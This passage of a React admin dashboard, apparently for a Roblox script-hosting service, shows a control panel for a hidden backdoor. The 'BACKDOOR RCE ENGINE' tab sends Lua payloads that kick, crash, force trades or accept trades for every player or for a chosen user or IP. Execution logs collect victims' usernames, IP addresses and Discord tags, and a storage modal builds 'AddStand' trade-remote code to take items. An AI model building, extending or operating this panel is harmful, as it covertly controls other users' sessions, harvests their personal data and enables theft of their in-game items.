                if (tab.id === 'backdoor') loadBackdoorHistory();
                if (tab.id === 'user_logs') loadLogsData();
              }}
              className={`flex items-center gap-2 px-4 py-3 rounded-xl transition-all cursor-pointer whitespace-nowrap ${
                isActive
                  ? 'bg-gradient-to-r from-blue-600 to-indigo-600 text-white shadow-[0_0_20px_rgba(79,70,229,0.4)]'
                  : tab.highlight
                  ? 'text-amber-400 hover:bg-white/5'
                  : 'text-slate-400 hover:text-white hover:bg-white/5'
              }`}
            >
              <Icon /> {tab.label}
            </button>
          );
        })}
      </nav>

      {/* TAB 1: HOME CONFIG */}
      {activeTab === 'custom_home' && (
        <div className="bg-slate-900/80 border border-white/10 p-5 sm:p-8 rounded-3xl space-y-6 shadow-2xl backdrop-blur-xl">
          <div className="text-sm font-black text-blue-400 flex items-center gap-2 uppercase tracking-wider">
            <Icons.Home /> HOME PAGE CONFIGURATION
          </div>

          <div className="space-y-5">
            <div>
              <label className="text-xs font-bold text-slate-300 mb-2 block">Home Loader Script:</label>
              <textarea
                rows={3}
                value={loaderScript}
                onChange={(e) => setLoaderScript(e.target.value)}
                className="w-full bg-slate-950/80 border border-white/10 p-3.5 rounded-2xl font-mono text-xs text-slate-200 focus:border-blue-500 outline-none transition-all"
              />
            </div>

            <div>
              <label className="text-xs font-bold text-slate-300 mb-2 block">Home Access Key:</label>
              <input
                type="text"
                value={currentKey}
                onChange={(e) => setCurrentKey(e.target.value)}
                className="w-full bg-slate-950/80 border border-white/10 p-3.5 rounded-2xl font-mono text-xs text-blue-400 font-extrabold focus:border-blue-500 outline-none transition-all"
              />
            </div>

            <div className="border border-white/10 p-5 rounded-2xl bg-slate-950/40 space-y-4">
              <div className="flex items-center justify-between">
                <label className="text-xs font-bold text-amber-400 flex items-center gap-2">
                  <Icons.Server /> Supported Games ({supportedGames.length}):
                </label>
                <button 
                  onClick={handleAddGame} 
                  className="bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 border border-blue-500/30 px-3.5 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-all active:scale-95"
                >
                  <Icons.Plus /> Add Game
                </button>
              </div>

              {supportedGames.map((game, idx) => (
                <div key={idx} className="bg-slate-900/90 border border-white/10 p-4 rounded-xl space-y-3">
                  <div className="flex justify-between items-center text-xs text-slate-400 font-bold">
                    <span>Game #{idx + 1}</span>
                    {supportedGames.length > 1 && (
                      <button onClick={() => handleRemoveGame(idx)} className="text-rose-400 hover:text-rose-300 text-[11px] bg-rose-500/10 px-2.5 py-1 rounded-lg cursor-pointer transition-all">
                        Remove
                      </button>
                    )}
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <input
                      type="text"
                      placeholder="Game Name"
                      value={game.name}
                      onChange={(e) => handleGameChange(idx, 'name', e.target.value)}
                      className="bg-slate-950 border border-white/10 p-2.5 rounded-xl text-xs font-bold text-white focus:border-blue-500 outline-none"
                    />
                    <input
                      type="text"
                      placeholder="Logo URL"
                      value={game.logo}
                      onChange={(e) => handleGameChange(idx, 'logo', e.target.value)}
                      className="bg-slate-950 border border-white/10 p-2.5 rounded-xl text-xs text-slate-300 focus:border-blue-500 outline-none"
                    />
                    <input
                      type="text"
                      placeholder="Status"
                      value={game.status}
                      onChange={(e) => handleGameChange(idx, 'status', e.target.value)}
                      className="bg-slate-950 border border-white/10 p-2.5 rounded-xl text-xs text-emerald-400 focus:border-blue-500 outline-none"
                    />
                    <input
                      type="text"
                      placeholder="Tag (e.g. ROBLOX)"
                      value={game.tag}
                      onChange={(e) => handleGameChange(idx, 'tag', e.target.value)}
                      className="bg-slate-950 border border-white/10 p-2.5 rounded-xl text-xs text-blue-400 font-mono focus:border-blue-500 outline-none"
                    />
                  </div>
                </div>
              ))}
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className="text-xs text-slate-400 font-semibold mb-1.5 block">YouTube Link:</label>
                <input
                  type="text"
                  value={youtubeLink}
                  onChange={(e) => setYoutubeLink(e.target.value)}
                  className="w-full bg-slate-950/80 border border-white/10 p-3 rounded-xl text-xs text-white focus:border-blue-500 outline-none"
                />
              </div>

              <div>
                <label className="text-xs text-slate-400 font-semibold mb-1.5 block">Discord Link:</label>
                <input
                  type="text"
                  value={discordLink}
                  onChange={(e) => setDiscordLink(e.target.value)}
                  className="w-full bg-slate-950/80 border border-white/10 p-3 rounded-xl text-xs text-white focus:border-blue-500 outline-none"
                />
              </div>

              <div>
                <label className="text-xs text-slate-400 font-semibold mb-1.5 block">Badge Text:</label>
                <input
                  type="text"
                  value={badgeText}
                  onChange={(e) => setBadgeText(e.target.value)}
                  className="w-full bg-slate-950/80 border border-white/10 p-3 rounded-xl text-xs text-blue-400 font-bold focus:border-blue-500 outline-none"
                />
              </div>

              <div>
                <label className="text-xs text-slate-400 font-semibold mb-1.5 block">Site Title:</label>
                <input
                  type="text"
                  value={siteTitle}
                  onChange={(e) => setSiteTitle(e.target.value)}
                  className="w-full bg-slate-950/80 border border-white/10 p-3 rounded-xl text-xs text-white font-extrabold focus:border-blue-500 outline-none"
                />
              </div>
            </div>
          </div>

          <button
            onClick={handleSaveMainPageSettings}
            disabled={isSaving}
            className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:brightness-110 text-white font-extrabold py-4 rounded-2xl text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(59,130,246,0.3)] transition-all cursor-pointer disabled:opacity-50 active:scale-[0.98]"
          >
            {isSaving ? 'SAVING...' : 'SAVE CONFIGURATION'}
          </button>
        </div>
      )}

      {/* TAB 2: SCRIPTS IDE & MANAGEMENT */}
      {activeTab === 'scripts' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Sidebar Script List */}
          <div className="lg:col-span-4 bg-slate-900/80 border border-white/10 p-4 rounded-3xl flex flex-col gap-4 backdrop-blur-xl h-fit">
            <button 
              onClick={handleCreateScript} 
              className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-extrabold py-3 px-4 rounded-2xl text-xs uppercase tracking-wider flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(59,130,246,0.3)] hover:brightness-110 active:scale-95 transition-all"
            >
              <Icons.Plus /> New Script
            </button>

            <div className="relative">
              <input
                type="text"
                placeholder="Search title or slug..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-slate-950/80 border border-white/10 rounded-2xl pl-10 pr-4 py-2.5 text-xs text-white placeholder:text-slate-500 focus:border-blue-500 outline-none transition-all"
              />
              <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500">
                <Icons.Search />
              </span>
            </div>

            <div className="flex gap-1.5 overflow-x-auto text-[11px] font-extrabold pb-1 no-scrollbar">
              <button onClick={() => setStatusFilter('all')} className={`px-3 py-1.5 rounded-xl border transition-all cursor-pointer whitespace-nowrap ${statusFilter === 'all' ? 'bg-white/15 border-white text-white' : 'border-white/5 text-slate-400 hover:text-white'}`}>All ({scripts.length})</button>
              <button onClick={() => setStatusFilter('working')} className={`px-3 py-1.5 rounded-xl border transition-all cursor-pointer whitespace-nowrap ${statusFilter === 'working' ? 'bg-emerald-500/20 border-emerald-500 text-emerald-400' : 'border-white/5 text-slate-400 hover:text-white'}`}>Active</button>
              <button onClick={() => setStatusFilter('updating')} className={`px-3 py-1.5 rounded-xl border transition-all cursor-pointer whitespace-nowrap ${statusFilter === 'updating' ? 'bg-amber-500/20 border-amber-500 text-amber-400' : 'border-white/5 text-slate-400 hover:text-white'}`}>Updating</button>
              <button onClick={() => setStatusFilter('patched')} className={`px-3 py-1.5 rounded-xl border transition-all cursor-pointer whitespace-nowrap ${statusFilter === 'patched' ? 'bg-rose-500/20 border-rose-500 text-rose-400' : 'border-white/5 text-slate-400 hover:text-white'}`}>Patched</button>
            </div>

            <div className="flex flex-col gap-2 max-h-[520px] overflow-y-auto pr-1">
              {filteredScripts.map((s) => (
                <div
                  key={s.id}
                  onClick={() => selectScriptHandler(s)}
                  className={`p-3.5 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-3 ${
                    selectedScript?.id === s.id 
                      ? 'bg-blue-600/15 border-blue-500 shadow-[0_0_20px_rgba(59,130,246,0.2)]' 
                      : 'bg-slate-950/40 border-white/5 hover:border-white/20'
                  }`}
                >
                  <div className="min-w-0 flex-1">
                    <div className="font-extrabold text-xs text-white truncate">{s.title}</div>
                    <div className="text-[10px] font-mono text-blue-400 truncate mt-0.5">/api/raw/{s.slug}</div>
                  </div>
                  <span className={`px-2.5 py-0.5 rounded-full text-[9px] font-black uppercase shrink-0 ${
                    s.status === 'patched' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                  }`}>{s.status || 'working'}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Code Editor & Script Details */}
          <div className="lg:col-span-8 flex flex-col gap-4">
            {selectedScript && (
              <div className="bg-slate-900/80 border border-white/10 p-5 sm:p-6 rounded-3xl space-y-5 shadow-2xl backdrop-blur-xl">
                
                {/* Loadstring Output */}
                <div className="bg-slate-950/90 p-4 rounded-2xl border border-blue-500/30 space-y-2.5">
                  <div className="flex items-center justify-between text-xs text-blue-400 font-bold uppercase tracking-wider">
                    <span>Execution Loadstring URL:</span>
                  </div>
                  <div className="bg-slate-900/90 p-3 rounded-xl font-mono text-xs text-slate-300 break-all border border-white/10 select-all">
                    {getScriptLoadstring(slug)}
                  </div>
                  <button 
                    onClick={() => handleCopyLoader(slug)} 
                    className="w-full bg-blue-600 hover:bg-blue-500 text-white font-extrabold py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-95"
                  >
                    {copiedLoader ? <Icons.Check /> : <Icons.Copy />}
                    {copiedLoader ? 'COPIED TO CLIPBOARD!' : 'COPY LOADSTRING'}
                  </button>
                </div>

                {/* Metadata Fields */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <div>
                    <label className="text-[10px] font-bold text-slate-400 mb-1 block uppercase">Title</label>
                    <input value={title} onChange={(e) => setTitle(e.target.value)} className="w-full bg-slate-950/80 border border-white/10 p-3 rounded-xl text-xs font-extrabold text-white focus:border-blue-500 outline-none" />
                  </div>
                  <div>
                    <label className="text-[10px] font-bold text-slate-400 mb-1 block uppercase">Slug (/api/raw/slug)</label>
                    <input value={slug} onChange={(e) => setSlug(e.target.value)} className="w-full bg-slate-950/80 border border-white/10 p-3 rounded-xl text-xs text-blue-400 font-mono focus:border-blue-500 outline-none" />
                  </div>
                  <div>
                    <label className="text-[10px] font-bold text-slate-400 mb-1 block uppercase">Status</label>
                    <select value={status} onChange={(e) => setStatus(e.target.value)} className="w-full bg-slate-950/80 border border-white/10 p-3 rounded-xl text-xs font-bold text-white focus:border-blue-500 outline-none cursor-pointer">
                      <option value="working">Working</option>
                      <option value="updating">Updating</option>
                      <option value="patched">Patched</option>
                    </select>
                  </div>
                </div>

                {/* Actions Bar */}
                <div className="flex flex-wrap items-center justify-between gap-2.5 pt-1">
                  <div className="flex gap-2 flex-1 flex-wrap">
                    <button onClick={handleSaveScript} disabled={isSaving} className="bg-blue-600 hover:bg-blue-500 text-white font-extrabold px-5 py-2.5 rounded-xl text-xs flex items-center gap-2 cursor-pointer active:scale-95 transition-all">
                      {isSaving ? 'Saving...' : 'Save Code'}
                    </button>
                    <button onClick={handleDuplicateScript} className="bg-purple-600/20 hover:bg-purple-600/30 text-purple-300 border border-purple-500/40 px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all">
                      Duplicate
                    </button>
                    <label className="bg-slate-800 hover:bg-slate-700 text-slate-200 border border-white/10 px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all">
                      Upload .lua
                      <input type="file" accept=".lua,.txt" onChange={handleUploadToEditor} className="hidden" />
                    </label>
                    <button onClick={() => setCode('')} className="bg-amber-600/20 hover:bg-amber-600/30 text-amber-300 border border-amber-500/40 px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all">
                      Clear
                    </button>
                  </div>
                  <button onClick={() => handleDeleteScript(selectedScript.id)} className="bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/40 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-all">
                    <Icons.Trash /> Delete
                  </button>
                </div>

                {/* Monaco Editor IDE */}
                <div className="h-[460px] border border-white/10 rounded-2xl overflow-hidden shadow-2xl bg-[#1e1e1e]">
                  <Editor height="100%" defaultLanguage="lua" theme="vs-dark" value={code} onChange={(v) => setCode(v || '')} options={{ minimap: { enabled: false }, fontSize: 13 }} />
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 3: BACKDOOR RCE */}
      {activeTab === 'backdoor' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-7 bg-slate-900/80 border border-amber-500/30 p-5 sm:p-7 rounded-3xl space-y-5 shadow-2xl backdrop-blur-xl">
            <div className="flex items-center justify-between border-b border-white/10 pb-4">
              <div className="flex items-center gap-2">
                <span className="p-2 bg-amber-500/10 text-amber-400 rounded-xl"><Icons.Terminal /></span>
                <h2 className="text-sm font-black text-amber-400 uppercase tracking-wider">BACKDOOR RCE ENGINE</h2>
              </div>
              <span className="text-[10px] bg-amber-500/10 border border-amber-500/30 text-amber-400 px-3 py-1 rounded-full font-extrabold tracking-widest uppercase">
                LOADSTRING READY
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className="text-[11px] font-extrabold text-slate-400 mb-1.5 block uppercase">TARGET TYPE:</label>
                <select
                  value={backdoorTargetType}
                  onChange={(e) => setBackdoorTargetType(e.target.value)}
                  className="w-full bg-slate-950 border border-white/10 p-3 rounded-xl text-xs font-bold text-white focus:border-amber-500 outline-none cursor-pointer"
                >
                  <option value="ALL">ALL PLAYERS</option>
                  <option value="USER">SPECIFIC USER</option>
                  <option value="IP">SPECIFIC IP</option>
                </select>
              </div>

              {backdoorTargetType !== 'ALL' && (
                <div>
                  <label className="text-[11px] font-extrabold text-slate-400 mb-1.5 block uppercase">TARGET VALUE ({backdoorTargetType}):</label>
                  <input
                    type="text"
                    placeholder={backdoorTargetType === 'USER' ? 'Roblox Username' : 'IP Address'}
                    value={backdoorTargetValue}
                    onChange={(e) => setBackdoorTargetValue(e.target.value)}
                    className="w-full bg-slate-950 border border-white/10 p-3 rounded-xl text-xs text-amber-400 font-mono focus:border-amber-500 outline-none"
                  />
                </div>
              )}
            </div>

            <div>
              <label className="text-[11px] font-extrabold text-slate-400 mb-2 block uppercase">PRESET PAYLOADS:</label>
              <div className="flex flex-wrap gap-2">
                {[
                  { id: 'kick', label: 'Kick Player', color: 'rose' },
                  { id: 'crash', label: 'Crash Client', color: 'purple' },
                  { id: 'notification', label: 'Send Notification', color: 'blue' },
                  { id: 'trade', label: 'Auto Trade', color: 'amber' },
                  { id: 'Agree', label: 'Accept Trade', color: 'emerald' },
                  { id: 'jumpscare', label: 'Jumpscare', color: 'yellow' },
                ].map((preset) => (
                  <button
                    key={preset.id}
                    onClick={() => setPresetPayload(preset.id)}
                    className="bg-slate-950 hover:bg-slate-800 border border-white/10 text-slate-200 hover:text-white px-3.5 py-2 rounded-xl text-xs font-bold cursor-pointer transition-all active:scale-95"
                  >
                    {preset.label}
                  </button>
                ))}
              </div>
            </div>

            <div>
              <label className="text-[11px] font-extrabold text-slate-400 mb-2 block uppercase">LUA PAYLOAD SCRIPT:</label>
              <div className="h-[260px] border border-white/10 rounded-2xl overflow-hidden shadow-inner bg-[#1e1e1e]">
                <Editor
                  height="100%"
                  defaultLanguage="lua"
                  theme="vs-dark"
                  value={backdoorLuaPayload}
                  onChange={(v) => setBackdoorLuaPayload(v || '')}
                  options={{ minimap: { enabled: false }, fontSize: 12 }}
                />
              </div>
            </div>

            <button
              onClick={handleSendBackdoor}
              disabled={isSendingBackdoor}
              className="w-full bg-gradient-to-r from-amber-500 via-orange-500 to-amber-600 text-slate-950 font-black py-4 rounded-2xl text-xs uppercase tracking-wider shadow-[0_0_25px_rgba(245,158,11,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 active:scale-[0.98] disabled:opacity-50"
            >
              <Icons.Zap /> {isSendingBackdoor ? 'EXECUTING PAYLOAD...' : 'EXECUTE REMOTE PAYLOAD'}
            </button>
          </div>

          <div className="lg:col-span-5 flex flex-col gap-5">
            <div className="bg-slate-900/80 border border-white/10 p-5 rounded-3xl space-y-3 backdrop-blur-xl">
              <div className="flex items-center justify-between text-xs font-black text-blue-400">
                <span>Integration Lua Snippet</span>
                <button onClick={handleCopyBackdoorSnippet} className="bg-blue-600 hover:bg-blue-500 text-white px-3 py-1 rounded-lg text-[10px] font-extrabold cursor-pointer transition-all">
                  {copiedBackdoorSnippet ? 'Copied' : 'Copy Code'}
                </button>
              </div>
              <p className="text-[11px] text-slate-400">Include this listener snippet inside raw scripts to execute dynamic admin commands:</p>
              <pre className="bg-slate-950 p-3.5 rounded-xl font-mono text-[10px] text-amber-300/90 border border-white/10 max-h-[160px] overflow-y-auto no-scrollbar">
                {getBackdoorLuaSnippet()}
              </pre>
            </div>

            <div className="bg-slate-900/80 border border-white/10 p-5 rounded-3xl space-y-4 backdrop-blur-xl flex-1">
              <h3 className="text-xs font-black text-white uppercase tracking-wider flex items-center gap-2">
                <Icons.Terminal /> Command History ({backdoorHistory.length})
              </h3>
              <div className="space-y-2.5 max-h-[280px] overflow-y-auto pr-1">
                {backdoorHistory.length === 0 ? (
                  <div className="text-xs text-slate-500 text-center py-8">No backdoor commands logged yet.</div>
                ) : (
                  backdoorHistory.map((h) => (
                    <div key={h.id} className="bg-slate-950/80 border border-white/10 p-3 rounded-xl font-mono text-[11px] space-y-1">
                      <div className="flex justify-between text-slate-400">
                        <span className="text-amber-400 font-bold">Target: {h.target_type} ({h.target_value})</span>
                        <span className="text-[10px]">{new Date(h.created_at).toLocaleTimeString('en-US')}</span>
                      </div>
                      <div className="text-slate-300 truncate font-sans text-xs">{h.payload_lua}</div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: USER EXECUTION LOGS */}
      {activeTab === 'user_logs' && (
        <div className="bg-slate-900/80 border border-white/10 p-5 sm:p-8 rounded-3xl space-y-6 shadow-2xl backdrop-blur-xl">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
            <div>
              <h2 className="text-sm font-black text-blue-400 flex items-center gap-2 uppercase tracking-wider">
                <Icons.Database /> Execution Logs ({filteredLogs.length}/{logs.length})
              </h2>
            </div>
            <div className="flex items-center gap-3 w-full sm:w-auto justify-end">
              <button 
                onClick={loadLogsData} 
                className="bg-slate-800 hover:bg-slate-700 text-slate-200 border border-white/10 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center gap-2 cursor-pointer transition-all active:scale-95"
              >
                <Icons.Refresh /> {isLoadingLogs ? 'Refreshing...' : 'Refresh Logs'}
              </button>
              <button 
                onClick={handleClearLogs} 
                className="bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center gap-2 cursor-pointer transition-all active:scale-95"
              >
                <Icons.Trash /> Clear All
              </button>
            </div>
          </div>

          <div className="relative">
            <input
              type="text"
              placeholder="Search logs by username, ID, IP address, Discord tag..."
              value={logSearchQuery}
              onChange={(e) => setLogSearchQuery(e.target.value)}
              className="w-full bg-slate-950/80 border border-white/10 rounded-2xl pl-10 pr-10 py-3 text-xs text-white placeholder:text-slate-500 focus:border-blue-500 outline-none transition-all shadow-inner"
            />
            <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500">
              <Icons.Search />
            </span>
            {logSearchQuery && (
              <button 
                onClick={() => setLogSearchQuery('')}
                className="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs text-slate-400 hover:text-white cursor-pointer bg-slate-800 px-2 py-1 rounded-md"
              >
                Clear
              </button>
            )}
          </div>

          <div className="overflow-x-auto border border-white/10 rounded-2xl bg-slate-950/40">
            <table className="w-full text-left text-xs">
              <thead className="bg-slate-950 text-slate-400 font-extrabold border-b border-white/10 uppercase text-[10px] tracking-wider">
                <tr>
                  <th className="p-4">Roblox User</th>
                  <th className="p-4">Server Type</th>
                  <th className="p-4">IP Address</th>
                  <th className="p-4">Discord / Executor</th>
                  <th className="p-4">Timestamp</th>
                  <th className="p-4">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5 font-mono">
                {filteredLogs.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="text-center py-10 text-slate-500 font-sans text-xs">
                      {logSearchQuery ? `No execution logs match "${logSearchQuery}"` : 'No execution logs recorded yet.'}
                    </td>
                  </tr>
                ) : (
                  filteredLogs.map((log) => {
                    const isCopied = copiedJoinId === log.id;

                    return (
                      <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
                        <td className="p-4 font-sans font-bold text-white">
                          <div className="text-sm">{log.roblox_username}</div>
                          <div className="text-[10px] text-slate-400 font-mono">ID: {log.roblox_id}</div>
                        </td>

                        <td className="p-4">
                          {log.is_vip ? (
                            <span className="inline-flex items-center gap-1 px-3 py-1 rounded-full text-[10px] font-black bg-purple-500/15 border border-purple-500/30 text-purple-300">
                              VIP Server
                            </span>
                          ) : (
                            <span className="inline-flex items-center gap-1 px-3 py-1 rounded-full text-[10px] font-black bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
                              Public Server
                            </span>
                          )}
                        </td>

                        <td className="p-4 text-blue-400 font-bold">{log.ip_address}</td>
                        
                        <td className="p-4 font-sans text-xs">
                          <div className="text-indigo-300 font-bold">{log.discord_user || 'N/A'}</div>
                          <div className="text-slate-400 text-[10px] font-mono mt-0.5">{log.executor}</div>
                        </td>

                        <td className="p-4 text-slate-400 text-[11px]">
                          {new Date(log.created_at).toLocaleString('en-US')}
                        </td>

                        <td className="p-4">
                          <div className="flex items-center gap-2 flex-wrap">
                            <button
                              onClick={() => handleOpenStorageModal(log)}
                              className="bg-blue-600/20 hover:bg-blue-600 border border-blue-500/40 text-blue-300 hover:text-white px-3 py-1.5 rounded-xl text-[11px] font-bold cursor-pointer transition-all active:scale-95"
                            >
                              Storage
                            </button>

                            {log.place_id && log.job_id ? (
                              <button
                                onClick={() => handleCopyJoinScript(log)}
                                className={`px-3 py-1.5 rounded-xl text-[11px] font-bold cursor-pointer transition-all active:scale-95 ${
                                  isCopied
                                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                                    : 'bg-indigo-600/20 hover:bg-indigo-600 border border-indigo-500/40 text-indigo-300 hover:text-white'
                                }`}
                              >
                                {isCopied ? 'Copied' : 'Copy Join'}
                              </button>
                            ) : (
                              <span className="text-[10px] text-slate-500 italic font-mono">No JobId</span>
                            )}

                            <button
                              onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
                              className="bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/40 text-amber-300 px-3 py-1.5 rounded-xl text-[11px] font-bold cursor-pointer transition-all active:scale-95"
                            >
                              Target
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 5: ADMIN SETTINGS */}
      {activeTab === 'settings' && (
        <div className="bg-slate-900/80 border border-white/10 p-6 sm:p-8 rounded-3xl space-y-5 shadow-2xl backdrop-blur-xl max-w-xl">
          <div className="text-sm font-black text-blue-400 flex items-center gap-2 uppercase tracking-wider">
            <Icons.Settings /> CHANGE ADMIN PASSWORD
          </div>
          <input
            type="password"
            placeholder="Enter new admin password..."
            value={newAdminPass}
            onChange={(e) => setNewAdminPass(e.target.value)}
            className="w-full bg-slate-950 border border-white/10 p-3.5 rounded-2xl text-xs text-white outline-none focus:border-blue-500 font-mono transition-all"
          />
          <button 
            onClick={handleSaveAdminPassword} 
            disabled={isSaving}
            className="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:brightness-110 text-white font-black py-4 rounded-2xl text-xs uppercase tracking-wider cursor-pointer transition-all active:scale-[0.98] disabled:opacity-50"
          >
            {isSaving ? 'UPDATING...' : 'UPDATE PASSWORD'}
          </button>
        </div>
      )}

      {/* MODAL: STORAGE LOGS DETAIL */}
      {isStorageModalOpen && selectedStorageLog && (
        <div className="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-md animate-fadeIn">
          <div className="bg-slate-900 border border-blue-500/30 w-full max-w-2xl rounded-3xl overflow-hidden shadow-[0_0_60px_rgba(59,130,246,0.3)] flex flex-col max-h-[85vh]">
            
            {/* Modal Header */}
            <div className="p-5 border-b border-white/10 flex items-center justify-between bg-slate-950/60">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 font-black">
                  <Icons.Box />
                </div>
                <div>
                  <h3 className="font-extrabold text-base sm:text-lg text-white flex items-center gap-2">
                    {selectedStorageLog.roblox_username}
                    <span className="text-xs px-2.5 py-0.5 rounded-full bg-white/10 text-blue-400 border border-blue-500/20 font-mono">
                      ID: {selectedStorageLog.roblox_id}
                    </span>
                  </h3>
                  <p className="text-[11px] text-slate-400">Click any Stand slot to copy remote AddStand payload</p>
                </div>
              </div>
              <button 
                onClick={() => setIsStorageModalOpen(false)}
                className="p-2 rounded-xl text-slate-400 hover:text-white hover:bg-white/10 transition-all cursor-pointer"
              >
                <Icons.Cross />
              </button>
            </div>

            {/* Modal Tabs */}
            <div className="p-3 bg-slate-950/40 border-b border-white/5 grid grid-cols-2 gap-2">
              <button
                onClick={() => setStorageTab('stands')}
                className={`py-2.5 px-4 rounded-xl font-black text-xs sm:text-sm flex items-center justify-center gap-2 transition-all cursor-pointer ${
                  storageTab === 'stands'
                    ? 'bg-blue-600 text-white shadow-[0_0_20px_rgba(59,130,246,0.4)]'
                    : 'bg-slate-900 text-slate-400 hover:text-white border border-white/5'
                }`}
              >
                Stand Storage
              </button>

              <button
                onClick={() => setStorageTab('inventory')}
                className={`py-2.5 px-4 rounded-xl font-black text-xs sm:text-sm flex items-center justify-center gap-2 transition-all cursor-pointer ${
                  storageTab === 'inventory'
                    ? 'bg-blue-600 text-white shadow-[0_0_20px_rgba(59,130,246,0.4)]'
                    : 'bg-slate-900 text-slate-400 hover:text-white border border-white/5'
                }`}
              >
                Inventory
              </button>
            </div>

            {/* Modal Body: Stands */}
            {storageTab === 'stands' && (
              <div className="p-5 overflow-y-auto space-y-4">
                {parsedStandData.slots && parsedStandData.slots.length > 0 ? (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {parsedStandData.slots.map((slot, idx) => {
                      const isCopied = copiedSlotIndex === slot.slot;

                      const handleCopyRemote = (e) => {
                        e.stopPropagation();
                        if (slot.is_empty) return;

                        const rawName = slot.raw_name || slot.name;
                        const attr = (slot.attribute && slot.attribute !== 'Không có' && slot.attribute !== 'None') ? slot.attribute : 'None';
                        const guid = slot.guid || '8554099967-42d08ba';

                        const remoteCode = `local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm\nEvent:FireServer("AddStand", { GUID = "${guid}", StandName = "${rawName}", Attribute = "${attr}" })`;

                        navigator.clipboard.writeText(remoteCode);
                        setCopiedSlotIndex(slot.slot);
                        setTimeout(() => setCopiedSlotIndex(null), 2000);
                      };

                      return (
                        <div 
                          key={idx}
                          onClick={handleCopyRemote}
                          className={`border rounded-2xl p-4 transition-all relative overflow-hidden group ${
                            slot.is_empty 
                              ? 'bg-slate-950/40 border-white/5 opacity-50 cursor-not-allowed' 
                              : 'bg-slate-950 border-blue-500/30 hover:border-blue-500 hover:shadow-[0_0_25px_rgba(59,130,246,0.25)] cursor-pointer'
                          }`}
                        >
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-[10px] font-extrabold uppercase tracking-wider text-slate-400 bg-white/5 px-2.5 py-0.5 rounded-md border border-white/10">
                              Slot {slot.slot}
                            </span>
                            {!slot.is_empty && (
                              <span className={`text-[10px] font-black px-2.5 py-0.5 rounded-lg border font-mono ${getTierStyle(slot.tier)}`}>
                                Tier: {slot.tier}
                              </span>
                            )}
                          </div>

                          <div className="font-extrabold text-base text-white truncate">
                            {slot.name}
                          </div>

                          <div className="mt-2 flex items-center gap-1.5 text-xs text-slate-400">
                            <span>Attribute: <strong className="text-slate-200">{slot.attribute}</strong></span>
                          </div>

                          {slot.guid && (
                            <div className="mt-1 text-[10px] font-mono text-slate-500 truncate">
                              GUID: {slot.guid}
                            </div>
                          )}

                          {!slot.is_empty && (
                            <div className="mt-3 pt-2.5 border-t border-white/5 flex items-center justify-between">
                              <span className="text-[10px] font-bold text-slate-400 group-hover:text-blue-400 transition-all">
                                {isCopied ? 'Copied Remote Code' : 'Copy AddStand Remote'}
                              </span>
                              <button
                                onClick={handleCopyRemote}
                                className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all ${
                                  isCopied
                                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                                    : 'bg-blue-600/20 text-blue-300 border border-blue-500/30 group-hover:bg-blue-600 group-hover:text-white'
                                }`}
                              >
                                {isCopied ? 'Copied' : 'Copy'}
                              </button>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                ) : (
                  <div className="text-center py-12 text-slate-500 font-bold text-xs">
                    No stand data recorded in storage.
                  </div>
                )}

                <div className="bg-slate-950 border border-blue-500/25 rounded-2xl p-4 flex items-center justify-between">
                  <div>
                    <div className="text-[10px] font-bold text-slate-400 uppercase">Spec Storage</div>
